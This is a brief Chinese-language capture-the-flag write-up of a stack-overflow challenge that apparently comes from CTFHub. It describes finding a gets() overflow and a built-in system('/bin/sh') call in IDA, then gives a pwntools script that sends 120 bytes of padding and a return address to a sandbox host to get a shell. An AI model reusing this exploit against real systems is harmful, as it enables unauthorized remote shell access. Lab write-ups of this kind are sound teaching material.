## Gets 栈溢出（BackDoor 指令）

IDA 分析发现栈溢出

![](https://pic1.imgdb.cn/item/688436f458cb8da5c8e01c67.png)

发现有利用 `system("/bin/sh")`，但是在函数内部

![](https://pic1.imgdb.cn/item/6884372158cb8da5c8e01d80.png)

在汇编视图可以看到相关的两条指令

![](https://pic1.imgdb.cn/item/6884377058cb8da5c8e01fa3.png)

拿到具体地址

![](https://pic1.imgdb.cn/item/6884376558cb8da5c8e01f5c.png)

构造 payload

```python
from pwn import *

p = remote("challenge-9f7798f5939d9729.sandbox.ctfhub.com", 27233)

payload = b'a' * 120 + p64(0x04007B8)
p.sendline(payload)
p.interactive()
```

![](https://pic1.imgdb.cn/item/6884387e58cb8da5c8e025c4.png)
